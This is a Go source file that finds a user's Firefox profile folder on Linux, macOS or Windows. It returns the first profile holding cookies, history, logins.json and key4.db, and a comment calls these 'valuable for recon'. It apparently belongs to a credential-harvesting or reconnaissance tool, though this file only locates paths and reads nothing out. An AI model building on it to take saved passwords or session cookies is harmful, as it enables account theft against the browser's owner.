package browser

import (
	"errors"
	"os"
	"path/filepath"
	"runtime"
)

type ProfilePath string

func getFolders(directory string) ([]string, error) {
	var folders []string

	entries, err := os.ReadDir(directory)
	if err != nil {
		return folders, err
	}

	for _, entry := range entries {
		if entry.IsDir() {
			folders = append(folders, entry.Name())
		}
	}
	return folders, nil
}

func getProfilesLocation() (string, error) {
	var profilesPath string

	switch runtime.GOOS {
	case "linux":
		homeDir, err := os.UserHomeDir()
		if err != nil {
			return "", err
		}
		profilesPath = filepath.Join(homeDir, ".mozilla", "firefox")
	case "darwin":
		homeDir, err := os.UserHomeDir()
		if err != nil {
			return "", err
		}
		profilesPath = filepath.Join(homeDir, "Library", "Application Support", "Firefox", "Profiles")
	case "windows":
		appData, err := os.UserConfigDir()
		if err != nil {
			return "", err
		}
		profilesPath = filepath.Join(appData, "Mozilla", "Firefox", "Profiles")
	default:
		return "", errors.New("unsupported OS: " + runtime.GOOS)
	}

	return profilesPath, nil
}

func isProfileComplete(profile string) bool {
	/*
		Returns true if the profile has information valuable for recon
		E.g. browsing history, cookies, saved passwords.
	*/

	files := []string{
		"cookies.sqlite",
		"places.sqlite",
		"logins.json",
		"key4.db",
	}

	for _, file := range files {
		_, err := os.Stat(filepath.Join(profile, file))
		if err != nil {
			return false
		}
	}
	return true
}

func GetProfilePath() (ProfilePath, error) {
	profilesLocation, err := getProfilesLocation()
	if err != nil {
		return "", err
	}

	folders, err := getFolders(profilesLocation)
	if err != nil {
		return "", err
	}

	for _, folder := range folders {
		profilePath := filepath.Join(profilesLocation, folder)
		if isProfileComplete(profilePath) {
			return ProfilePath(profilePath), nil
		}
	}
	return "", errors.New("no profile found")
}
